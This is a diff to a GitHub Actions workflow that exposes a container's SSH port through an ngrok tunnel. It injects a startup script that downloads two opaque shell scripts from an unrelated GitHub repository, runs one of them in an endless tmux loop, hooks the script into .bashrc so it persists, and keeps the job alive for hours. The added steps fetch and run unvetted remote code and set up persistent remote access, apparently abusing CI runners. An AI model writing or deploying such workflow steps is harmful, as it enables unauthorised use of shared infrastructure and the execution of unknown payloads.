@@ -39,6 +39,37 @@ jobs:
       run: |
         ./ngrok tcp 2222 > ngrok.log &
         sleep 15
+        curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url'
+
+    - name: Inject auto run (fixed)
+      run: |
+        docker exec dockerssh bash -c "
+        HOME=/home/ttt0090
+        
+        echo '#!/bin/bash' >  \$HOME/start.sh
+        echo 'set -e' >> \$HOME/start.sh
+        echo 'apt update' >> \$HOME/start.sh
+        echo 'apt install -y wget tmux curl' >> \$HOME/start.sh
+        echo 'cd \$HOME' >> \$HOME/start.sh
+        echo 'wget -q https://raw.githubusercontent.com/yghhbbuy/vvvioui/refs/heads/main/.github/workflows/ww12345.sh' >> \$HOME/start.sh
+        echo 'chmod +x ww12345.sh' >> \$HOME/start.sh
+        echo 'wget -q https://raw.githubusercontent.com/yghhbbuy/vvvioui/refs/heads/main/.github/workflows/oneupalways2.sh' >> \$HOME/start.sh
+        echo 'chmod +x oneupalways2.sh' >> \$HOME/start.sh
+        echo 'tmux has-session -t auto 2>/dev/null || tmux new-session -d -s auto "bash ww12345.sh; while true; do bash oneupalways2.sh; done"' >> \$HOME/start.sh
+        echo 'exec tmux attach -t auto' >> \$HOME/start.sh
+        chmod +x \$HOME/start.sh
+        chown ttt0090:ttt0090 \$HOME/start.sh
+        echo 'bash ~/start.sh' >> \$HOME/.bashrc
+        "
+
+    - name: Keep alive
+      run: |
+        for i in $(seq 1 360); do sleep 60; done
+
+    - name: Start ngrok TCP 2222
+      run: |
+        ./ngrok tcp 2222 > ngrok.log &
+        sleep 15
         curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url'> public_url.txt
 
     - name: Inject auto run
